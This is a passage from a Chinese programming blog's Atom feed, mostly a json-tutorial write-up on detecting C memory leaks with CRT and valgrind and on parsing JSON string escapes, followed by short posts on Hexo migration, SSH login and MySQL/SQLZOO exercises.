下的内存泄漏检测方法"></a>1A. Windows 下的内存泄漏检测方法</h2><p>在 Windows 下，可使用 Visual C++ 的 <a href="https://msdn.microsoft.com/zh-cn/library/x98tx3cf.aspx">C Runtime Library（CRT） 检测内存泄漏</a>。</p><p>首先，我们在两个 .c 文件首行插入这一段代码：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WINDOWS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRTDBG_MAP_ALLOC</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crtdbg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>并在 <code>main()</code> 开始位置插入：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WINDOWS</span></span><br><span class="line">    <span class="variable">_CrtSetDbgFlag</span>(<span class="variable">_CRTDBG_ALLOC_MEM_DF</span> | <span class="variable">_CRTDBG_LEAK_CHECK_DF</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在 Debug 配置下按 F5 生成、开始调试程序，没有任何异样。</p><p>然后，我们删去 <code>lept_set_boolean()</code> 中的 <code>lept_free(v)</code>：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void lept<span class="constructor">_set_boolean(<span class="params">lept_value</span><span class="operator">*</span> <span class="params">v</span>, <span class="params">int</span> <span class="params">b</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* lept_free(v); */</span></span><br><span class="line">    v-&gt;<span class="keyword">type</span> = b ? LEPT_TRUE : LEPT_FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次按 F5 生成、开始调试程序，在输出会看到内存泄漏信息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Detected</span> memory leaks!</span><br><span class="line"><span class="attribute">Dumping</span> objects -&gt;</span><br><span class="line"><span class="attribute">C</span>:\GitHub\json-tutorial\tutorial<span class="number">03</span>_answer\leptjson.c(<span class="number">212</span>) : &#123;<span class="number">79</span>&#125; normal block at <span class="number">0</span>x<span class="number">013</span>D<span class="number">9868</span>, <span class="number">2</span> bytes long.</span><br><span class="line"> <span class="attribute">Data</span>: &lt;a &gt; <span class="number">61</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">Object</span> dump complete.</span><br></pre></td></tr></table></figure><p>这正是我们在单元测试中，先设置字符串，然后设布尔值时没释放字符串所分配的内存。比较麻烦的是，它没有显示调用堆栈。从输出信息中 <code>... &#123;79&#125; ...</code> 我们知道是第 79 次分配的内存做成问题，我们可以加上 <code>_CrtSetBreakAlloc(79);</code> 来调试，那么它便会在第 79 次时中断于分配调用的位置，那时候就能从调用堆栈去找出来龙去脉。</p><h2 id="1B-Linux-OSX-下的内存泄漏检测方法"><a href="#1B-Linux-OSX-下的内存泄漏检测方法" class="headerlink" title="1B. Linux/OSX 下的内存泄漏检测方法"></a>1B. Linux/OSX 下的内存泄漏检测方法</h2><p>在 Linux、OS X 下，我们可以使用 <a href="https://valgrind.org/">valgrind</a> 工具（用 <code>apt-get install valgrind</code>、 <code>brew install valgrind</code>）。我们完全不用修改代码，只要在命令行执行：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">valgrind</span> <span class="string">--leak-check=full</span>  <span class="string">./leptjson_test</span></span><br><span class="line"><span class="string">==22078==</span> <span class="string">Memcheck,</span> <span class="string">a</span> <span class="string">memory</span> <span class="string">error</span> <span class="string">detector</span></span><br><span class="line"><span class="string">==22078==</span> <span class="string">Copyright</span> <span class="string">(C)</span> <span class="number">2002</span><span class="number">-2015</span><span class="string">,</span> <span class="string">and</span> <span class="string">GNU</span> <span class="string">GPL&#x27;d,</span> <span class="string">by</span> <span class="string">Julian</span> <span class="string">Seward</span> <span class="string">et</span> <span class="string">al.</span></span><br><span class="line"><span class="string">==22078==</span> <span class="string">Using</span> <span class="string">Valgrind-3.11.0</span> <span class="string">and</span> <span class="string">LibVEX;</span> <span class="string">rerun</span> <span class="string">with</span> <span class="string">-h</span> <span class="string">for</span> <span class="string">copyright</span> <span class="string">info</span></span><br><span class="line"><span class="string">==22078==</span> <span class="attr">Command:</span> <span class="string">./leptjson_test</span></span><br><span class="line"><span class="string">==22078==</span> </span><br><span class="line"><span class="string">--22078--</span> <span class="attr">run:</span> <span class="string">/usr/bin/dsymutil</span> <span class="string">&quot;./leptjson_test&quot;</span></span><br><span class="line"><span class="number">160</span><span class="string">/160</span> <span class="string">(100.00%)</span> <span class="string">passed</span></span><br><span class="line"><span class="string">==22078==</span> </span><br><span class="line"><span class="string">==22078==</span> <span class="attr">HEAP SUMMARY:</span></span><br><span class="line"><span class="string">==22078==</span>     <span class="attr">in use at exit:</span> <span class="number">27</span><span class="string">,728</span> <span class="string">bytes</span> <span class="string">in</span> <span class="number">209</span> <span class="string">blocks</span></span><br><span class="line"><span class="string">==22078==</span>   <span class="attr">total heap usage:</span> <span class="number">301</span> <span class="string">allocs,</span> <span class="number">92</span> <span class="string">frees,</span> <span class="number">34</span><span class="string">,966</span> <span class="string">bytes</span> <span class="string">allocated</span></span><br><span class="line"><span class="string">==22078==</span> </span><br><span class="line"><span class="string">==22078==</span> <span class="number">2</span> <span class="string">bytes</span> <span class="string">in</span> <span class="number">1</span> <span class="string">blocks</span> <span class="string">are</span> <span class="string">definitely</span> <span class="string">lost</span> <span class="string">in</span> <span class="string">loss</span> <span class="string">record</span> <span class="number">1</span> <span class="string">of</span> <span class="number">79</span></span><br><span class="line"><span class="string">==22078==</span>    <span class="attr">at 0x100012EBB:</span> <span class="string">malloc</span> <span class="string">(in</span> <span class="string">/usr/local/Cellar/valgrind/3.11.0/lib/valgrind/vgpreload_memcheck-amd64-darwin.so)</span></span><br><span class="line"><span class="string">==22078==</span>    <span class="attr">by 0x100008F36:</span> <span class="string">lept_set_string</span> <span class="string">(leptjson.c:208)</span></span><br><span class="line"><span class="string">==22078==</span>    <span class="attr">by 0x100008415:</span> <span class="string">test_access_boolean</span> <span class="string">(test.c:187)</span></span><br><span class="line"><span class="string">==22078==</span>    <span class="attr">by 0x100001849:</span> <span class="string">test_parse</span> <span class="string">(test.c:229)</span></span><br><span class="line"><span class="string">==22078==</span>    <span class="attr">by 0x1000017A3:</span> <span class="string">main</span> <span class="string">(test.c:235)</span></span><br><span class="line"><span class="string">==22078==</span> </span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p>它发现了在 <code>test_access_boolean()</code> 中，由 <code>lept_set_string()</code> 分配的 2 个字节（<code>&quot;a&quot;</code>）泄漏了。</p><p>Valgrind 还有很多功能，例如可以发现未初始化变量。我们若在应用程序或测试程序中，忘了调用 <code>lept_init(&amp;v)</code>，那么 <code>v.type</code> 的值没被初始化，其值是不确定的（indeterministic），一些函数如果读取那个值就会出现问题：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_access_boolean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lept_value v;</span><br><span class="line">    <span class="comment">/* lept_init(&amp;v); */</span></span><br><span class="line">    lept_set_string(&amp;v, <span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种错误有时候测试时能正确运行（刚好 <code>v.type</code> 被设为 <code>0</code>），使我们误以为程序正确，而在发布后一些机器上却可能崩溃。这种误以为正确的假像是很危险的，我们可利用 valgrind 能自动测出来：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ valgrind --leak-check=full  ./leptjson_test</span><br><span class="line">...</span><br><span class="line">==<span class="number">22174</span>== Conditional jump <span class="keyword">or</span> move depends on uninitialised value(s)</span><br><span class="line">==<span class="number">22174</span>==    at <span class="number">0x100008B5D</span>: lept_free (leptjson.c:<span class="number">164</span>)</span><br><span class="line">==<span class="number">22174</span>==    by <span class="number">0x100008F26</span>: lept_set_string (leptjson.c:<span class="number">207</span>)</span><br><span class="line">==<span class="number">22174</span>==    by <span class="number">0x1000083FE</span>: test_access_boolean (test.c:<span class="number">187</span>)</span><br><span class="line">==<span class="number">22174</span>==    by <span class="number">0x100001839</span>: test_parse (test.c:<span class="number">229</span>)</span><br><span class="line">==<span class="number">22174</span>==    by <span class="number">0x100001793</span>: main (test.c:<span class="number">235</span>)</span><br><span class="line">==<span class="number">22174</span>== </span><br></pre></td></tr></table></figure><p>它发现 <code>lept_free()</code> 中依靠了一个未初始化的值来跳转，就是 <code>v.type</code>，而错误是沿自 <code>test_access_boolean()</code>。</p><p>编写单元测试时，应考虑哪些执行次序会有机会出错，例如内存相关的错误。然后我们可以利用 TDD 的步骤，先令测试失败（以内存工具检测），修正代码，再确认测试是否成功。</p><ol start="2"><li>实现除了 <code>\u</code> 以外的转义序列解析，令 <code>test_parse_string()</code> 中所有测试通过。</li></ol><p>转义序列的解析很直观，对其他不合法的字符返回 <code>LEPT_PARSE_INVALID_STRING_ESCAPE</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_string</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">char</span> ch = *p++;</span><br><span class="line">        <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;\\&#x27;</span>:    <span class="comment">// 前面还有一个\是为了符合C语言的语法</span></span><br><span class="line">                <span class="keyword">switch</span> (*p++) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;\&quot;&#x27;</span>: PUTC(c, <span class="string">&#x27;\&quot;&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;\\&#x27;</span>: PUTC(c, <span class="string">&#x27;\\&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:  PUTC(c, <span class="string">&#x27;/&#x27;</span> ); <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:  PUTC(c, <span class="string">&#x27;\b&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:  PUTC(c, <span class="string">&#x27;\f&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:  PUTC(c, <span class="string">&#x27;\n&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:  PUTC(c, <span class="string">&#x27;\r&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:  PUTC(c, <span class="string">&#x27;\t&#x27;</span>); <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        c-&gt;top = head;</span><br><span class="line">                        <span class="keyword">return</span> LEPT_PARSE_INVALID_STRING_ESCAPE;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">           <span class="comment">/* ... */</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>解决 <code>test_parse_invalid_string_escape()</code> 和 <code>test_parse_invalid_string_char()</code> 中的失败测试。</li></ol><p>上面已解决不合法转义，余下部分的唯一难度，是要从语法中知道哪些是不合法字符：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">unescaped</span> = %x<span class="number">20</span>-<span class="number">21</span> / %x<span class="number">23</span>-<span class="number">5</span>B / %x<span class="number">5</span>D-<span class="number">10</span>FFFF</span><br></pre></td></tr></table></figure><p>当中空缺的 %x22 是双引号，%x5C 是反斜线，都已经处理。所以不合法的字符是 %x00 至 %x1F。我们简单地在 default 里处理：</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">char</span>)ch &lt; <span class="number">0x20</span>) &#123; </span><br><span class="line">            c-&gt;top = head;</span><br><span class="line">            <span class="keyword">return</span> LEPT_PARSE_INVALID_STRING_CHAR;</span><br><span class="line">        &#125;</span><br><span class="line">        PUTC(c, ch);</span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure><p>注意到 <code>char</code> 带不带符号，是实现定义的。如果编译器定义 <code>char</code> 为带符号的话，<code>(unsigned char)ch &gt;= 0x80</code> 的字符，都会变成负数，并产生 <code>LEPT_PARSE_INVALID_STRING_CHAR</code> 错误。（？）我们现时还没有测试 ASCII 以外的字符，所以有没有转型至不带符号都不影响，但下一单元开始处理 Unicode 的时候就要考虑了。</p><ol start="4"><li>思考如何优化 <code>test_parse_string()</code> 的性能，那些优化方法有没有缺点。（？）</li></ol><ul><li><p>如果整个字符串都没有转义符，我们不就是把字符复制了两次？第一次是从 <code>json</code> 到 <code>stack</code>，第二次是从 <code>stack</code> 到 <code>v-&gt;u.s.s</code>。我们可以在 <code>json</code> 扫描 <code>&#39;\0&#39;</code>、<code>&#39;\&quot;&#39;</code> 和 <code>&#39;\\&#39;</code> 3 个字符（ <code>ch &lt; 0x20</code> 还是要检查），直至它们其中一个出现，才开始用现在的解析方法。这样做的话，前半没转义的部分可以只复制一次。缺点是，代码变得复杂一些，我们也不能使用 <code>lept_set_string()</code>。</p></li><li><p>对于扫描没转义部分，我们可考虑用 SIMD 加速，如 <a href="https://zhuanlan.zhihu.com/p/20037058">RapidJSON 代码剖析（二）：使用 SSE4.2 优化字符串扫描</a> 的做法。这类底层优化的缺点是不跨平台，需要设置编译选项等。</p></li><li><p>在 gcc/clang 上使用 <code>__builtin_expect()</code> 指令来处理低概率事件，例如需要对每个字符做 <code>LEPT_PARSE_INVALID_STRING_CHAR</code> 检测，我们可以假设出现不合法字符是低概率事件，然后用这个指令告之编译器，那么编译器可能可生成较快的代码。然而，这类做法明显是不跨编译器，甚至是某个版本后的 gcc 才支持。</p></li><li><p>……</p></li></ul><h1 id="七、参考"><a href="#七、参考" class="headerlink" title="七、参考"></a>七、参考</h1><p>[1] <a href="https://zhuanlan.zhihu.com/p/20029820">RapidJSON 代码剖析（一）：混合任意类型的堆栈</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第三单元，重点在于解析字符串类型。&lt;/p&gt;</summary>
    
    
    
    <category term="项目" scheme="https://www.fvolcano.red/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="json" scheme="https://www.fvolcano.red/tags/json/"/>
    
  </entry>
  
  <entry>
    <title>理解前端工程化</title>
    <link href="https://www.fvolcano.red/2021/null/"/>
    <id>https://www.fvolcano.red/2021/null/</id>
    <published>2021-07-24T05:18:44.000Z</published>
    <updated>2021-07-24T05:18:44.000Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>认识Vue.js和axios</title>
    <link href="https://www.fvolcano.red/2021/get-to-know-Vue-and-axios/"/>
    <id>https://www.fvolcano.red/2021/get-to-know-Vue-and-axios/</id>
    <published>2021-07-24T04:04:58.000Z</published>
    <updated>2021-07-24T04:04:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>Vue.js目前是前端非常受欢迎的一个框架。<a id="more"></a></p><p><img src="/2021/get-to-know-Vue-and-axios/image-20210724121137201.png" alt="image-20210724121137201"></p><h1 id="Vue是什么"><a href="#Vue是什么" class="headerlink" title="Vue是什么"></a>Vue是什么</h1><h1 id="Vue的特点"><a href="#Vue的特点" class="headerlink" title="Vue的特点"></a>Vue的特点</h1><h2 id="渐进性"><a href="#渐进性" class="headerlink" title="渐进性"></a>渐进性</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;Vue.js目前是前端非常受欢迎的一个框架。&lt;/p&gt;</summary>
    
    
    
    <category term="前端" scheme="https://www.fvolcano.red/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="介绍" scheme="https://www.fvolcano.red/tags/%E4%BB%8B%E7%BB%8D/"/>
    
  </entry>
  
  <entry>
    <title>将hexo博客从github pages迁移到云服务器</title>
    <link href="https://www.fvolcano.red/2021/move-hexo-from-githubPages-to-ECS/"/>
    <id>https://www.fvolcano.red/2021/move-hexo-from-githubPages-to-ECS/</id>
    <published>2021-07-23T08:03:02.000Z</published>
    <updated>2021-07-23T08:03:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录我在迁移博客过程中遇到的几个问题。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.csdn.net/sinat_28394909/article/details/84956292">阿里云搭建Hexo博客</a></li><li><a href="https://eliyar.biz/how_to_build_hexo_blog/">从 0 开始搭建 hexo 博客</a></li><li><a href="https://hjxlog.com/posts/20191130a1.html">将Hexo部署到阿里云轻量服务器（保姆级教程）</a></li><li><a href="https://razeencheng.com/post/daily-hexo-auto-refresh.html">云服务器搭建 hexo 博客，git hooks自动更新</a></li></ol><h1 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h1><h3 id="1-bash-git-receive-pack-command-not-found"><a href="#1-bash-git-receive-pack-command-not-found" class="headerlink" title="1. bash: git-receive-pack: command not found"></a>1. bash: git-receive-pack: command not found</h3><p>使用了网上的方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原因：远程服务器上的git安装路径是<span class="regexp">/usr/</span>local<span class="regexp">/common/gi</span>t，不是默认路径，所以需要建立链接文件：</span><br><span class="line">ln -s <span class="regexp">/usr/</span>local<span class="regexp">/common/gi</span>t<span class="regexp">/bin/gi</span>t-receive-pack <span class="regexp">/usr/</span>bin/git-receive-pack</span><br></pre></td></tr></table></figure><p>但是不奏效，突然想到我记忆中我的git的bin不是这个路径，一看果然，是/usr/local/git/bin，但修改后报错：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln: failed to <span class="keyword">create</span> symbolic <span class="keyword">link</span> ‘/usr/<span class="keyword">bin</span>/git-receive-pack’: <span class="keyword">File</span> <span class="keyword">exists</span></span><br></pre></td></tr></table></figure><p>查看<code>/usr/bin</code>内容，发现之前创建的两个快捷方式存在了，虽然<code>/usr/local/common/git/bin</code>这个目录不存在，显示为了红色：</p><p><img src="/2021/move-hexo-from-githubPages-to-ECS/image-20210723163814673.png" alt="image-20210723163814673"></p><p>先删除再执行这两条命令，解决。</p><h3 id="2-git钩子相关"><a href="#2-git钩子相关" class="headerlink" title="2.git钩子相关"></a>2.git钩子相关</h3><h3 id="3-unable-to-unlink-…-Permission-denied"><a href="#3-unable-to-unlink-…-Permission-denied" class="headerlink" title="3.unable to unlink … Permission denied"></a>3.unable to unlink … Permission denied</h3><p>权限问题，修改根目录文件夹的权限。</p><h3 id="4-阿里云配置了域名后，域名和ip都能ping通，但是访问应用失败"><a href="#4-阿里云配置了域名后，域名和ip都能ping通，但是访问应用失败" class="headerlink" title="4.阿里云配置了域名后，域名和ip都能ping通，但是访问应用失败"></a>4.阿里云配置了域名后，域名和ip都能ping通，但是访问应用失败</h3>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录我在迁移博客过程中遇到的几个问题。&lt;/p&gt;</summary>
    
    
    
    <category term="博客" scheme="https://www.fvolcano.red/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="hexo" scheme="https://www.fvolcano.red/tags/hexo/"/>
    
    <category term="ECS" scheme="https://www.fvolcano.red/tags/ECS/"/>
    
  </entry>
  
  <entry>
    <title>本地与云服务器SSH免密登录</title>
    <link href="https://www.fvolcano.red/2021/how-to-login-without-passwd-between-local-and-remote/"/>
    <id>https://www.fvolcano.red/2021/how-to-login-without-passwd-between-local-and-remote/</id>
    <published>2021-07-23T07:39:00.000Z</published>
    <updated>2021-07-23T07:39:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍了如何使本地和云服务器ssh登录不需要输入密码。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><p><a href="https://blog.csdn.net/idiot5lie/article/details/110954739">【已解决】本地与云服务器 ssh 免密登陆（详细分析，共四种情况）</a></p></li><li><p><a href="https://www.jianshu.com/p/e3d63fa3ef63">vscode &amp; windows terminal实现远程服务器免密登录</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文介绍了如何使本地和云服务器ssh登录不需要输入密码。&lt;/p&gt;</summary>
    
    
    
    <category term="linux" scheme="https://www.fvolcano.red/categories/linux/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>通过MySQL语句中各个部分的执行顺序理解其写法</title>
    <link href="https://www.fvolcano.red/2021/understand-the-mistakes-in-MySQL/"/>
    <id>https://www.fvolcano.red/2021/understand-the-mistakes-in-MySQL/</id>
    <published>2021-07-21T05:27:59.000Z</published>
    <updated>2021-07-21T05:27:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文解释了MySQL在执行语句时的逻辑，帮助更好地理解怎样写出正确的SQL语句。<a id="more"></a></p><p>手写顺序：</p><p>SELECT DISTINCT</p><p>FROM</p><p>JOIN ON</p><p>WHERE</p><p>GROUP BY</p><p>HAVING</p><p>ORDER BY</p><p>LIMIT</p><p>MySQL执行顺序</p><p>FROM</p><p>ON</p><p>JOIN</p><p>WHERE</p><p>GROUP BY</p><p>HAVING</p><p>DISTINCT</p><p>ORDER BY</p><p>LIMIT</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f66affaa88fd119677e767d18aaa3b5a.png" alt="f66affaa88fd119677e767d18aaa3b5a.png"></p><h3 id="where-先执行"><a href="#where-先执行" class="headerlink" title="where 先执行"></a>where 先执行</h3><p><img src="/2021/understand-the-mistakes-in-MySQL/image-20210721152001024.png" alt="image-20210721152001024"></p><p>应该选D。此处对于SUM(area)的限制应该由having来完成，因为where是在group by之前进行筛选，不知道将哪些area拿来做筛选。</p><h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3><p><img src="/2021/understand-the-mistakes-in-MySQL/image-20210721171019613.png" alt="image-20210721171019613"></p><p>最后应该为<code>group by matchid, mdate</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文解释了MySQL在执行语句时的逻辑，帮助更好地理解怎样写出正确的SQL语句。&lt;/p&gt;</summary>
    
    
    
    <category term="MySQL" scheme="https://www.fvolcano.red/categories/MySQL/"/>
    
    
  </entry>
  
  <entry>
    <title>对于MySQL中内部select引用外部数据的理解</title>
    <link href="https://www.fvolcano.red/2021/refer-to-data-outside-in-MySQL/"/>
    <id>https://www.fvolcano.red/2021/refer-to-data-outside-in-MySQL/</id>
    <published>2021-07-20T23:42:53.000Z</published>
    <updated>2021-07-20T23:42:53.000Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="MySQL" scheme="https://www.fvolcano.red/categories/MySQL/"/>
    
    
  </entry>
  
  <entry>
    <title>SQLZOO典型题记录</title>
    <link href="https://www.fvolcano.red/2021/some-representative-solutions-in-SQLZOO/"/>
    <id>https://www.fvolcano.red/2021/some-representative-solutions-in-SQLZOO/</id>
    <published>2021-07-20T03:15:39.000Z</published>
    <updated>2021-07-20T03:15:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>SQLZOO是一个MySQL的在线练习平台，本文记录了其中的一些典型题目。<a id="more"></a></p><p>SQLZOO：<a href="https://sqlzoo.net/">https://sqlzoo.net/</a></p><p><a href="https://zhuanlan.zhihu.com/p/77780577">SQLZOO习题全解，答案参考-英文版</a></p><h3 id="ROUND-to-the-nearest-1000"><a href="#ROUND-to-the-nearest-1000" class="headerlink" title="ROUND to the nearest 1000"></a>ROUND to the nearest 1000</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720112918353.png" alt="image-20210720112918353"></p><h3 id="how-to-type-umlaut"><a href="#how-to-type-umlaut" class="headerlink" title="how to type umlaut"></a>how to type umlaut</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720135006641.png" alt="image-20210720135006641"></p><p><a href="https://www.wikiwand.com/en/%C3%9C#/Keyboarding">如何打出Ü：wiki</a></p><h3 id="write-apostrophe-in-string"><a href="#write-apostrophe-in-string" class="headerlink" title="write apostrophe in string"></a>write apostrophe in string</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720135251465.png" alt="image-20210720135251465"></p><p>在字符串内用两个单引号代替一个单引号。</p><h3 id="IN-expression-can-be-used-as-a-value"><a href="#IN-expression-can-be-used-as-a-value" class="headerlink" title="IN expression can be used as a value"></a>IN expression can be used as a value</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720142016146.png" alt="image-20210720142016146"></p><p>这里输入标准答案会报错。</p><p>其他答案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT </span><br><span class="line">  winner, subject</span><br><span class="line">FROM </span><br><span class="line">  nobel</span><br><span class="line">WHERE </span><br><span class="line">  yr &#x3D; 1984</span><br><span class="line">ORDER BY </span><br><span class="line">  CASE WHEN subject IN (&#39;Physics&#39;,&#39;Chemistry&#39;) THEN 1 ELSE 0 END, </span><br><span class="line">  subject, </span><br><span class="line">  winner</span><br></pre></td></tr></table></figure><h3 id="display-percentage"><a href="#display-percentage" class="headerlink" title="display percentage"></a>display percentage</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720162738882.png" alt="image-20210720162738882"></p><h3 id="lt-、-gt-over-a-list"><a href="#lt-、-gt-over-a-list" class="headerlink" title="&lt;、&gt; over a list"></a>&lt;、&gt; over a list</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720164328985.png" alt="image-20210720164328985"></p><p>You need the condition <strong>population&gt;0</strong> in the sub-query as some countries have <strong>null</strong> for population!</p><h3 id="First-of-each"><a href="#First-of-each" class="headerlink" title="First of each"></a>First of each</h3><p><img src="/2021/some-representative-solutions-in-SQLZOO/image-20210720165950117.png" alt="image-20210720165950117"></p><p>其他答案：</p><figure class="highlight 